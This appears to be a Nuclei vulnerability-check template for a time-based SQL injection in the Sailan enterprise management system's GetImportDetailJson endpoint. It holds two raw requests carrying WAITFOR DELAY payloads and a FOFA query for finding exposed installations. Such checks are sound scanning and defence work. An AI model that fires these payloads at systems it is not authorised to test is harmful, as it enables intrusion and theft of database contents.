http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        - |
          GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
id: sailan-GetImportDetailJson-sql
info:
    author: Superhero
    description: |-
        fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
        赛蓝企业管理系统 GetImportDetailJson 接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 赛蓝企业管理系统 GetImportDetailJson SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486525&idx=1&sn=a9a84a8b86f6b7d71a4693fa4e226b2b&chksm=c267b90ef5103018659cb0d39490917960af506b229ee4d98ccf3763ecd603d04948760e9f17&token=1628549949&lang=zh_CN#rd
    severity: high
    tags:
        - 赛蓝企业管理系统
